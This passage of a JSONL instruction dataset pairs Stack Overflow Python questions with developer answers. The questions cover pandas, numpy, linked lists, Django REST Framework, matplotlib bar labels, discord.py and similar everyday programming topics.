href=\"https:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.svm.SVC.html\" rel=\"nofollow noreferrer\">this<\/a> probability must be enabled prior to calling fit, so you can't change it in the model loaded from pickle file.<\/p>\n<p>You have to either use your own trained model (the one you created and called fit on) or use another pretrained model(loaded from pickle file) with proabiblity attribute enabled.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to extract a color channel from array of images in python<p>I have a tensor of 10 samples, each which contain 10 time-series 20x20x3 RGB images which I would like to extract the green color channel<\/p>\n<p>The images are stored in an array of arrays called images<\/p>\n<p>For example:<\/p>\n<pre><code>images[0][0][:,:,1]\n<\/code><\/pre>\n<p>returns back the green channel for for one image in one sample.<\/p>\n<p>However, when I try to use the command:<\/p>\n<pre><code>images[0][:][:,:,1] \n<\/code><\/pre>\n<p>I receive the error:<\/p>\n<pre><code>IndexError: too many indices for array\n<\/code><\/pre>\n<p>How would I generalize my first line of code to pull all of the green channel images from the 1st sample?<\/p>\n<p>Shapes of the data:<\/p>\n<pre><code>images.shape\n(10,)\n\nimages[0].shape\n(10,)\n\nimages[0][0].shape\n(20,20,3)\n<\/code><\/pre>\n<p>Here is a sample of the data. The data are images which were extrated from a .mat file so it is stored as an array of arrays, with a sample shown below:<\/p>\n<pre><code>images\narray([[array([[[41,  0,  0],\n    [43,  0,  0],\n    [45,  0,  0],\n    ...,\n    [18,  0,  0],\n    [ 5,  0,  0],\n    [ 0,  0,  0]],\n\n   [[45,  0,  0],\n    [50,  0,  0],\n    [49,  0,  0],\n    ...,\n    [ 3,  0,  0],\n    [ 0,  0,  0],\n    [ 0,  0,  0]],\n\n   [[49,  0,  0],\n    [49,  0,  0],\n    [48,  0,  0],\n    ...,\n    [ 0,  0,  0],\n    [ 0,  0,  0],\n    [ 0,  0,  0]],\n\n   ...,\n\n   [[16,  0,  0],\n    [ 5,  0,  0],\n    [ 1,  0,  0],\n    ...,\n    [ 0,  0,  0],\n    [ 0,  0,  0],\n    [ 0,  0,  0]],\n\n   [[ 3,  0,  0],\n    [ 1,  0,  0],\n    [ 0,  0,  0],\n    ...,\n    [ 0,  0,  0],\n    [ 0,  0,  0],\n    [ 0,  0,  0]],\n\n   [[ 0,  0,  0],\n    [ 0,  0,  0],\n    [ 0,  0,  0],\n    ...,\n    [ 0,  0,  0],\n    [ 0,  0,  0],\n    [ 0,  0,  0]]], dtype=uint8),\n    array([[[87,  0,  0],\n    [92,  0,  0],\n    [86,  0,  0],\n    ...,\n    [33,  0,  0],\n    [51,  0,  0],\n    [60,  0,  0]],\n\n   [[90,  0,  0],\n    [88,  0,  0],\n    [79,  0,  0],\n    ...,\n    [11,  0,  0],\n    [21,  0,  0],\n    [41,  0,  0]],\n\n   [[89,  0,  0],\n    [82,  0,  0],\n    [62,  0,  0],\n    ...,\n    [12,  0,  0],\n    [ 4,  0,  0],\n    [16,  0,  0]],\n\n   ...,\n\n   [[77,  0,  0],\n    [77,  0,  0],\n    [76,  0,  0],\n    ...,\n    [48,  0,  0],\n    [44,  0,  0],\n    [42,  0,  0]],\n\n   [[88,  0,  0],\n    [85,  0,  0],\n    [85,  0,  0],\n    ...,\n    [54,  0,  0],\n    [53,  0,  0],\n    [51,  0,  0]],\n\n   [[89,  0,  0],\n    [89,  0,  0],\n    [88,  0,  0],\n    ...,\n    [55,  0,  0],\n    [54,  0,  0],\n    [53,  0,  0]]], dtype=uint8),\n<\/code><\/pre>","output_text":"<p>Something like this?<\/p>\n<pre><code>green_0 = [i[:,:,1] for i in images[0]]\nall_greens = [[i[:,:,1] for i in ims] for ims in images]\n<\/code><\/pre>\n<p>but if <code>images<\/code> is already a numpy array, you can simply do <code>images[0,:,:,:,1]<\/code> and <code>images[:,:,:,:,1]<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Delete all negative nodes from linked list and get sum of nodes from linked list in python<p>def delete_negative and sumOfNode are both broken and I'm unsure of how to fix them.\ndelete_negative is supposed to go through the linked list and delete any negative numbers.\nsumOfNode is supposed to return the sum of all values in the linked list.<\/p>\n<p>Could someone please walk me through this?<\/p>\n<pre><code>class Node:\n    def __init__(self,data):\n        self.data = data\n        self.next = None\n        \nclass linked_list:\n    def __init__(self):\n        self.head=None\n        self.count=0\n\n    def insertEnd(self, newNode):\n        if self.head is None:\n            self.head=newNode\n        else:\n            lastNode=self.head\n            while True:\n                if lastNode.next is None:\n                    break\n                lastNode=lastNode.next\n            lastNode.next=newNode\n\n    def insertHead(self, newNode):\n        tempNode = self.head\n        self.head = newNode         \n        self.head.next = tempNode        \n        #del tempNode\n\n    def delete_negative(self):\n        temp = self.head\n        self.head = self.head.next\n        if self.head &lt; 0:\n            temp = None\n\n    def sumOfNode(self): \n        while self.head != None:\n            temp = self.head\n            yield self.head.data\n            self.head = self.head.next\n\n        return sum(sumOfNode())\n      \nFirstNode=Node(2)\nmylist=linked_list()\nmylist.insertEnd(FirstNode)\n\nSecondNode=Node(3)\nmylist.insertEnd(SecondNode)\n\nThirdNode=Node(4)\nmylist.insertEnd(ThirdNode)\n\nFourthNode=Node(1)\nmylist.insertHead(FourthNode)\n<\/code><\/pre>","output_text":"<p>Always make a display function to view your linked list. It helps you debug.\nNever ever modify your head pointer. It is the only point of reference to your linked list. Use a temp variable to traverse through the list.<\/p>\n<p>While deleting negative values from the list, there are 2 cases:<\/p>\n<ol>\n<li>The head value is negative<\/li>\n<li>Other values are negative<\/li>\n<\/ol>\n<p>Each has to be handled differently.<\/p>\n<p>Your choice of using a generator function for sum of values was wise. But implementation was a bit off.<\/p>\n<pre><code>class Node:\n    def __init__(self,data):\n        self.data = data\n        self.next = None\n        \nclass linked_list:\n    def __init__(self):\n        self.head=None\n        self.count=0\n\n    def insertEnd(self, newNode):\n        if self.head is None:\n            self.head=newNode\n        else:\n            lastNode=self.head\n            while True:\n                if lastNode.next is None:\n                    break\n                lastNode=lastNode.next\n            lastNode.next=newNode\n\n    def insertHead(self, newNode):\n        tempNode = self.head\n        self.head = newNode         \n        self.head.next = tempNode        \n        #del tempNode\n\n    def delete_negative(self):\n        temp = self.head\n        prev = None\n        while temp:\n            if temp.data &lt; 0:\n                if temp == self.head:\n                    self.head = temp.next\n                    temp = self.head\n                else:\n                    prev.next = temp.next\n                    temp = temp.next\n            else:\n                prev = temp\n                temp = temp.next\n\n    def sumOfNode(self):\n        temp = self.head\n        def get_sum(temp):\n            while temp:\n                yield temp.data\n                temp = temp.next\n        return sum(get_sum(temp))\n    \n    def display(self):\n        temp = self.head\n        while temp:\n            print(temp.data)\n            temp = temp.next\n      \nFirstNode=Node(2)\nmylist=linked_list()\nmylist.insertEnd(FirstNode)\n\nSecondNode=Node(-3)\nmylist.insertEnd(SecondNode)\n\nThirdNode=Node(4)\nmylist.insertEnd(ThirdNode)\n\nFourthNode=Node(1)\nmylist.insertHead(FourthNode)\nmylist.display()\nprint(&quot;Sum=&quot;,mylist.sumOfNode())\nmylist.delete_negative()\nmylist.display()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to fix the error 'TypeError: can't pickle time objects'?<p>I am using the OpenOPC library to read data from an OPC Server, I am using 'Matrikon OPC Simulation Server', when I try to read the data it sends me the following error:<\/p>\n<pre><code>TypeError: can't pickle time objects\n<\/code><\/pre>\n<p>The code I use is the following, I run it from the python console.<\/p>\n<p><strong>CODE:<\/strong><\/p>\n<pre><code>import OpenOPC\nopc = OpenOPC.client()\nopc.connect('Matrikon.OPC.Simulation')\nopc.read('Random.Int4')\n<\/code><\/pre>\n<p>When I run the line opc.read ('Random.Int4'), that's when the error appears.<\/p>\n<p>This is how the variable appears in my MatrikonOPC Explorer:\n<a href=\"https:\/\/i.stack.imgur.com\/wlOHM.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/wlOHM.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>This is the complete error:<\/p>\n<pre><code>Traceback (most recent call last):\n  File &quot;C:\\Python27\\Lib\\multiprocessing\\queues.py&quot;, line 264, in _feed\n    send(obj)\nTypeError: can't pickle time objects\nTraceback (most recent call last):\n  File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt;\n  File &quot;C:\\Users\\User\\PycharmProjects\\OPC2\\venv\\lib\\site-packages\\OpenOPC.py&quot;, line 625, in read\n    return list(results)\n  File &quot;C:\\Users\\User\\PycharmProjects\\OPC2\\venv\\lib\\site-packages\\OpenOPC.py&quot;, line 543, in iread\n    raise TimeoutError('Callback: Timeout waiting for data')\nTimeoutError: Callback: Timeout waiting for data\n<\/code><\/pre>","output_text":"<p>I solved this issue by adding <code>sync=True<\/code> when calling <code>opc.read()<\/code><\/p>\n<p><strong>CODE:<\/strong><\/p>\n<pre><code>import OpenOPC\nopc = OpenOPC.client()\nopc.connect('Matrikon.OPC.Simulation')\nopc.read('Random.Int4', sync=True)\n<\/code><\/pre>\n<ul>\n<li>Reference: <a href=\"https:\/\/github.com\/mkwiatkowski\/openopc\/pull\/4\/commits\/80099d318e59e7ec848e743e4c10a27968380eac\" rel=\"nofollow noreferrer\">mkwiatkowski\/openopc<\/a><\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to add extra key in created object in Django Rest Framework?<p>I'm new to Django<\/p>\n<p>Currently I'm trying to add a simple extra key on my returned json in the serializer. Here's the <code>create()<\/code> override of my serializer:<\/p>\n<pre><code>    def create(self, validated_data):\n        available_dates = validated_data.pop(&quot;available_dates&quot;)\n\n        # Default expiry time is 3 days\n        expiry = datetime.datetime.now() + datetime.timedelta(days=3)\n        event = Events.objects.create(**validated_data, expiry=expiry)\n        for selectedTime in available_dates:\n            AvailableDates.objects.create(\n                event=event,\n                **selectedTime,\n            )\n\n        signer = Signer()\n        signedObject = signer.sign_object(\n            {&quot;expiry&quot;: expiry.isoformat(), &quot;id&quot;: event.id}\n        )\n\n        return {**event, &quot;signed_url&quot;: signedObject}\n\n<\/code><\/pre>\n<p>As you can see, I don't want to only return event, but I want to add a signed url.<\/p>\n<p>This gave me an error:\n<code>'Events' object is not a mapping<\/code><\/p>\n<p>So then how do I add extra key? What do I return in the create function? Can I create <code>Response()<\/code> as the return of create function in DRF?<\/p>","output_text":"<p>The <code>.create()<\/code> method of serializers need to return the instance that was created. After a successful create, it is used as the instance for the serializer when accessing <code>serializer.data<\/code> (Like how its used in a retrieve api)<\/p>\n<hr \/>\n<p>As for adding a <code>signed_url<\/code>, you can add it in a field in your serializer, like:<\/p>\n<pre><code>class EventSerializer(ModelSerializer):\n   # other fields ...\n   signed_url = SerializerMethodField()\n\n   class Meta:\n       model = Event\n       fields = [\n           # other fields ...\n           &quot;signed_url&quot;,\n       ]\n\n   def create(self, validated_data):\n        available_dates = validated_data.pop(&quot;available_dates&quot;)\n\n        # Default expiry time is 3 days\n        expiry = datetime.datetime.now() + datetime.timedelta(days=3)\n        event = Events.objects.create(**validated_data, expiry=expiry)\n        for selectedTime in available_dates:\n            AvailableDates.objects.create(\n                event=event,\n                **selectedTime,\n            )\n\n        signer = Signer()\n        signedObject = signer.sign_object(\n            {&quot;expiry&quot;: expiry.isoformat(), &quot;id&quot;: event.id}\n        )\n        event.signedObject = signedObject\n\n        return event\n    def get_signed_url(self,obj):\n         if not hasattr(obj, &quot;signedObject&quot;):\n             return None\n         # you can add other code here if you need to do something else with signedObject\n         return obj.signedObject\n\n<\/code><\/pre>\n<p>There are other ways to do it. But the one above might do it based on the code provided.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Google colab pip install<p>If I install packages on google-colab with<\/p>\n<pre><code>!pip install package_name\n<\/code><\/pre>\n<p>Will they be stored somewhere on my laptop or is everything stored online?<\/p>\n<p>Thanks!<\/p>","output_text":"<p>All data will only store in the session you are currently in if you are using Google\u2019s server, nothing will download to your machine unless you are using Colab to connect to your local runtime.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Use pandas groupby to fetch frequency count based on time intervals<p>I have a dataframe like as shown below<\/p>\n<pre><code>df = pd.DataFrame({'subject_id':[1,1,1,2,2,2],\n              'start_time':['2130-03-25 18:51:47','2130-04-23 18:51:47','2130-04-23 18:51:47','2120-01-11 18:51:47','2120-01-11 18:51:47','2120-04-28 18:51:47'],\n              'test_time':['2130-03-26 14:51:47','2130-04-24 18:51:47','2130-04-25 18:51:47','2121-02-26 18:51:47','2121-02-26 18:51:47','2120-04-28 19:51:47'],\n              'test':['test1','test2','test2','test2','test3','test3']})\ndf['start_time'] = pd.to_datetime(df['start_time'])\ndf['test_time'] = pd.to_datetime(df['test_time'])\n<\/code><\/pre>\n<p>What I would like to do is<\/p>\n<p>a) Get the number of tests done for each subject every 24 hours from <code>start_time<\/code>. The test time can be found from the <code>test_time<\/code> column<\/p>\n<p>Example - By 24hours, I mean <code>0-24hours<\/code>, <code>24-48hours<\/code>, <code>48-72hours<\/code> etc.<\/p>\n<p>I tried the below<\/p>\n<pre><code>df['time_diff'] = (df.test_time - df.start_time) \/ pd.Timedelta(hours=1)\nconditions = [\n    (df['time_diff'] &gt;= 0) &amp; (df['time_diff'] &lt;= 24),\n    (df['time_diff'] &gt;24 ) &amp; (df['time_diff'] &lt;= 48),\n    (df['time_diff'] &gt; 48) &amp; (df['time_diff'] &lt;= 72)]\nchoices = ['0-24hrs','24-48hrs','48-72hrs']\ndf['op'] = np.select(conditions, choices, default='Greater than 3 days')\ndf.groupby(['subject_id','test','op'])['test'].count()\n<\/code><\/pre>\n<p>However the above produces an output in incorrect format.<\/p>\n<p>I expect my output to be like as shown below<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/5Xqwy.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/5Xqwy.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>You can just adding <code>unstack<\/code><\/p>\n<pre><code>out = df.groupby(['subject_id','test','op'])['test'].count().unstack(fill_value=0).reset_index()\nout\nop  subject_id   test  0-24hrs  24-48hrs  Greater than 3 days\n0            1  test1        1         0                    0\n1            1  test2        1         1                    0\n2            2  test2        0         0                    1\n3            2  test3        1         0                    1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Hangman Project trouble in while loop<p>Can someone help me for this hangman project i want when user will enter one character letter then automatically to check that letter if it is in get_word and from that if it is add to result in the right place not for example if user enters a and the word is banana , if is first written letter a to be not in index 0 but to be in right index , index 1 , index 3 and index 5.Check my code you will understand it better thank you!<\/p>\n<pre><code>import random \n\nword_list = ['book','banana','peach','car','house','people','chair','table','juice','sleep','window']\nget_word = random.randint(0,len(word_list)-1)\nget_word = word_list[get_word]\nx = &quot;_&quot;*len(get_word)\nprint(&quot;The word is&quot; , x)\nattempts = 0\nresult = ''\nwhile attempts &lt; 5:\n    print(&quot;Enter a letter&quot;)\n    guess = input()\n    if len(guess) == 1:\n        for word in guess:\n            if word in get_word:\n                result += word\n            else:\n                result += &quot;_&quot;\n    print(result)\n<\/code><\/pre>","output_text":"<p>I would iterate over the letters of your word and check if they match with the guess. If yes, replace the &quot;_&quot; with the guess.<\/p>\n<pre><code>import random\n\nword_list = [\n    &quot;book&quot;,\n    &quot;banana&quot;,\n    &quot;peach&quot;,\n    &quot;car&quot;,\n    &quot;house&quot;,\n    &quot;people&quot;,\n    &quot;chair&quot;,\n    &quot;table&quot;,\n    &quot;juice&quot;,\n    &quot;sleep&quot;,\n    &quot;window&quot;,\n]\nget_word = random.choice(word_list)\nattempts = 0\nresult = [&quot;_&quot;] * len(get_word)\nprint(&quot;The word is&quot;, &quot;&quot;.join(result))\nwhile attempts &lt; 5:\n    print(&quot;Enter a letter&quot;)\n    guess = input()\n    if len(guess) == 1:\n        for i, letter in enumerate(get_word):\n            if letter == guess:\n                result[i] = guess\n        if guess not in get_word:\n            attempts += 1\n    print(&quot;&quot;.join(result))\n    \n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to annotate each segment of a stacked bar chart<p><a href=\"https:\/\/i.stack.imgur.com\/LvFxg.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/LvFxg.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>I've been trying to annotate each sub-amount of a stacked bar chart with its values like the picture shown above (values not accurate, just an example).<\/p>\n<pre><code>df.iloc[1:].T.plot(kind='bar', stacked=True)\nplt.show()\n<\/code><\/pre>\n<p>Data frame that I used:\n<a href=\"https:\/\/i.stack.imgur.com\/gVHyu.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/gVHyu.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>The linked post is somewhat similar to my question but I do not understand the code given in that answer nor were there any explanations given.<\/p>\n<p><a href=\"https:\/\/stackoverflow.com\/questions\/48922328\/annotating-values-in-stacked-bar-chart-matplotlib\">Annotating Values in Stacked Bar Chart Matplotlib<\/a><\/p>","output_text":"<h2>Imports and DataFrame<\/h2>\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\nimport matplotlib.pyplot as plt\n\ndata = {'var': ['TR', 'AC', 'F&amp;B'], '2019 1Q': [6600, 1256, 588], '2019 2Q': [6566, 1309, 586], '2019 3Q': [7383, 1525, 673]}\ndf = pd.DataFrame(data)\ndf.set_index('var', inplace=True)\n\n# display(df)\n     2019 1Q  2019 2Q  2019 3Q\nvar                           \nTR      6600     6566     7383\nAC      1256     1309     1525\nF&amp;B      588      586      673\n<\/code><\/pre>\n<h2>Update as of <code>matplotlib v3.4.2<\/code><\/h2>\n<ul>\n<li>Use <a href=\"https:\/\/matplotlib.org\/stable\/api\/_as_gen\/matplotlib.pyplot.bar_label.html\" rel=\"nofollow noreferrer\"><code>matplotlib.pyplot.bar_label<\/code><\/a><\/li>\n<li>See <a href=\"https:\/\/stackoverflow.com\/a\/67561982\/7758804\">How to add value labels on a bar chart<\/a> for additional details and examples with <code>.bar_label<\/code>.<\/li>\n<li>Tested with <code>pandas v1.2.4<\/code>, which is using <code>matplotlib<\/code> as the plot engine.<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>ax = df.T.plot.bar(stacked=True, figsize=(6, 5), rot=0)\n\nfor c in ax.containers:\n    ax.bar_label(c, label_type='center')\n    \nax.legend(title='Categories', bbox_to_anchor=(1.05, 1), loc='upper left')\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/tyVCu.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/tyVCu.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<h2>Original Answer - prior to <code>matplotlib v3.4.2<\/code><\/h2>\n<ul>\n<li><a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.transpose.html\" rel=\"nofollow noreferrer\">Transpose<\/a> the dataframe and then use <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.plot.bar.html\" rel=\"nofollow noreferrer\"><code>pandas.DataFrame.plot.bar<\/code><\/a> with <code>stacked=True<\/code>.<\/li>\n<li>An <code>ndarray<\/code> is returned with one <a href=\"https:\/\/matplotlib.org\/api\/axes_api.html#matplotlib.axes.Axes\" rel=\"nofollow noreferrer\"><code>matplotlib.axes.Axes<\/code><\/a> per column with <code>subplots=True<\/code>.\n<ul>\n<li>In the case of this figure, <code>ax.patches<\/code> contains 9 <a href=\"https:\/\/matplotlib.org\/3.3.1\/api\/_as_gen\/matplotlib.patches.Rectangle.html\" rel=\"nofollow noreferrer\"><code>matplotlib.patches.Rectangle<\/code><\/a> objects, one for each segment of each bar.\n<ul>\n<li>By using the associated methods for this object, the <code>height<\/code>, <code>width<\/code>, <code>x<\/code>, and <code>y<\/code> locations can be extracted, and used to annotate the rectangles.<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<\/li>\n<li>The difference this question has from <a href=\"https:\/\/stackoverflow.com\/questions\/62239435\/how-to-annotate-a-stacked-bar-chart-with-word-count-and-column-name\">How to annotate a stacked bar chart with word count and column name?<\/a> is the other question needs to extract and use alternate text for labels, and this dataframe needed to be transposed.<\/li>\n<\/ul>\n<pre class=\"lang-py prettyprint-override\"><code>ax = df.T.plot.bar(stacked=True)\nplt.legend(title='Categories', bbox_to_anchor=(1.05, 1), loc='upper left')\n\nfor i, rect in enumerate(ax.patches):\n    # Find where everything is located\n    height = rect.get_height()\n    width = rect.get_width()\n    x = rect.get_x()\n    y = rect.get_y()\n\n    # The height of the bar is the count value and can used as the label\n    label_text = f'{height:.0f}'\n\n    label_x = x + width \/ 2\n    label_y = y + height \/ 2\n\n    # don't include label if it's equivalently 0\n    if height &gt; 0.001:\n        ax.text(label_x, label_y, label_text, ha='center', va='center', fontsize=8)\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/UjXeT.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/UjXeT.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to comment out a chunk of a single line of code in python?<p>In languages like PHP we can do the following:<\/p>\n<pre class=\"lang-php prettyprint-override\"><code>&gt;&gt;&gt; echo &quot;cat is&quot;.&quot; not&quot;.&quot; dead&quot;\ncat is not dead\n\n&gt;&gt;&gt; echo &quot;cat is&quot;\/*.&quot; not&quot;*\/.&quot; dead&quot;\ncat is dead\n<\/code><\/pre>\n<p>What I have done on the second line is, commenting out a chunk of it using PHP's multi-line comment feature.<\/p>\n<p>Please let me know how to do the same in Python without breaking the line of code into separate lines.<\/p>\n<p>Thanks..!<\/p>","output_text":"<p>Generally, no. To keep old code around, duplicate the line, comment out one, and modify the other.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n List does not change in attempt to solve \"Delete node in Doubly Linked List\"<p>I am working on the GeeksForGeeks problem <a href=\"https:\/\/practice.geeksforgeeks.org\/problems\/delete-node-in-doubly-linked-list\/1\/\" rel=\"nofollow noreferrer\">Delete node in Doubly Linked List<\/a>:<\/p>\n<blockquote>\n<p>Given a doubly linked list and a position. The task is to delete a node from given position in a doubly linked list.<\/p>\n<h3>Your Task:<\/h3>\n<p>The task is to complete the function <code>deleteNode()<\/code> which should delete the node at given position and return the head of the linkedlist.<\/p>\n<\/blockquote>\n<p>My code:<\/p>\n<pre><code>def deleteNode(self,head, x):\n    # Code here\n    temp=head        \n    count_of_nodes=0\n    prev_of_delete_node=None\n    next_of_delete_node=None\n    while temp != head:\n        count_of_nodes+=1\n        if count_of_nodes==x:\n            prev_of_delete_node=temp.prev\n            next_of_delete_node=temp.next\n            #print(y.data,z.data)\n            prev_of_delete_node.next=next_of_delete_node\n            next_of_delete_node.prev=prev_of_delete_node\n            break\n        \n        temp=temp.next\n    \n    if x==1:\n        head=next_of_delete_node\n<\/code><\/pre>\n<p>There is no effect on the doubly LinkedList after executing above code. Why is this?<\/p>","output_text":"<p>Some issues:<\/p>\n<ul>\n<li><p>The <code>while<\/code> condition is wrong: it is false immediately, so the loop will not execute.<\/p>\n<\/li>\n<li><p>The value for <code>prev_of_delete_node<\/code> could be <code>None<\/code> when you dereference it with <code>prev_of_delete_node.next<\/code>. So guard that operation. Same for <code>next_of_delete_node<\/code>.<\/p>\n<\/li>\n<li><p>The function doesn't return anything, but it should return the head of the list after the deletion<\/p>\n<\/li>\n<\/ul>\n<p>Correction:<\/p>\n<pre><code>def deleteNode(self,head, x): \n    temp=head\n    count_of_nodes=0\n    prev_of_delete_node=None\n    next_of_delete_node=None\n    while temp:  # Corrected loop condition\n        count_of_nodes+=1\n        if count_of_nodes==x:\n            prev_of_delete_node=temp.prev\n            next_of_delete_node=temp.next\n            if prev_of_delete_node:  # Guard\n                prev_of_delete_node.next=next_of_delete_node\n            if next_of_delete_node:  # Guard\n                next_of_delete_node.prev=prev_of_delete_node\n            break\n        \n        temp=temp.next\n    # Should return:\n    if x==1:\n        return next_of_delete_node\n    return head \n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Discord.py bot not sending the whole message<p>I have a discord bot that when I enter .members, it answers back with all the list of member ids.<\/p>\n<p>This is my code:<\/p>\n<pre><code>mainbot = commands.Bot(command_prefix = &quot;.&quot;)\n\n@mainbot.command()\n@commands.guild_only()\nasync def member(ctx):\n    for members in ctx.guild.members:\n        ids = members.id\n\n    await ctx.channel.send(ids)\n\nmainbot.run(token_test)\n<\/code><\/pre>\n<p>However, it doesn't send back all the ids. Instead, it sends back the last id in the list.<\/p>\n<p>What I'm I doing wrong? Python 3.8<\/p>","output_text":"<p>Your command always rewrites ids. You should make ids a string, and then add each member's id:<\/p>\n<pre><code>mainbot = commands.Bot(command_prefix = &quot;.&quot;)\n\n@mainbot.command()\n@commands.guild_only()\nasync def member(ctx):\n    ids = ''\n    for members in ctx.guild.members:\n        ids += '{}, '.format(members.id)               # += is the change\n\n    await ctx.channel.send(ids)\n\nmainbot.run(token_test)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to split a list's value into two lists<p>How can I split a 'time' value into two 'day' 'time' lists?<\/p>\n<p>See attached image:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/OckvM.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/OckvM.png\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>If you have it as <code>datetime<\/code>object:<\/p>\n<pre><code>datos['day']  = dados['time'].dt.date\ndatos['time'] = dados['time'].dt.time\n<\/code><\/pre>\n<p>If you have it as <code>string<\/code> object:<\/p>\n<pre><code>datos['day']  = dados['time'].str[:11]\ndatos['time'] = dados['time'].str[11:]\n<\/code><\/pre>\n<p>Or<\/p>\n<pre><code>data[['day', 'time']] = data['time'].str.split(' ').apply(pd.Series)\ndata[['day', 'time']] = data['time'].str.split(' ', expand=True)\n<\/code><\/pre>\n<p>Or using <code>regex<\/code><\/p>\n<pre><code>data[['day', 'time']] = data['time'].str.extract('(.*) (.*)')\n<\/code><\/pre>\n<hr \/>\n<p>To convert it to <code>string<\/code>:<\/p>\n<pre><code>datos['time'] = dados['time'].astype(str)\n<\/code><\/pre>\n<p>It is better then converting to normal list <code>[str(x) ...]<\/code><\/p>\n<hr \/>\n<p>To convert it to <code>datetime<\/code><\/p>\n<pre><code>datos['time'] = pd.to_datetime(dados['time'])\n<\/code><\/pre>\n<p>It may use options - ie. <code>yearfirst=True<\/code>, <code>dayfirst=True<\/code>, <code>format=&quot;%Y-%m-%d %H:%I:%S&quot;<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Apply a string replace to several columns of a pandas dataframe<p>I have a dataframe with several columns, two of which are strings of URIs with a final fragment such as:<\/p>\n<p><code>http:\/\/company.com\/information#name<\/code><\/p>\n<p><code>http:\/\/company.com\/information#Company<\/code><\/p>\n<p>where I need to keep only &quot;name&quot; and &quot;Company&quot; URI fragments, and remove the string before the pound.<\/p>\n<p>I have written the following function to do so on a passed dataframe , also passing a list of column names to act upon, and finally the string to remove from each of them:<\/p>\n<pre><code>def uri_fragment(DF: pd.DataFrame, COLUMN_LIST: list, URI_STRING: str) -&gt; pd.DataFrame:\n    for DF_COLUMN in COLUMN_LIST:\n        DF['DF_COLUMN'] = DF['DF_COLUMN'].map(lambda x: x.replace(URI_STRING,''))\n    return DF\n<\/code><\/pre>\n<p>which I invoke as:<\/p>\n<pre><code>my_df = uri_fragment(my_df, ['class', 'type'], &quot;http:\/\/company.com\/information#&quot;) \n<\/code><\/pre>\n<p>to get the &quot;class&quot; and &quot;type&quot; dataframe columns cleaned up of the passed URI string.<\/p>\n<p>but get the following error:<\/p>\n<pre><code>KeyError: 'DF_COLUMN'\n<\/code><\/pre>\n<p>What am I overlooking\/misunderstanding?\nThank you<\/p>","output_text":"<p>You are using a literal string in your function. You should remove the quotes:<\/p>\n<pre><code>DF[DF_COLUMN] = DF[DF_COLUMN].\u2026\n<\/code><\/pre>\n<p>That said, a simpler method would be to use a regex. <code>map<\/code> will be quite slow:<\/p>\n<pre><code>for col in ['col', 'col2']:\n    # here extracting any terminal fragment. You could also use\n    # f'{URI_STRING}([^#]+)$' for limited matching\n    df[col] = df[col].str.extract('#([^#]+)$', expand=False)\n<\/code><\/pre>\n<p>Also, another critic of your code, you are both returning <code>DF<\/code> and modifying it in place. You should do only one of the two.<\/p>\n<p>Either don't return anything and modify in place, or return a new dataframe. For the second option, make a copy of <code>DF<\/code> by adding <code>DF = DF.copy()<\/code> in the beginning of the function.<\/p>"}
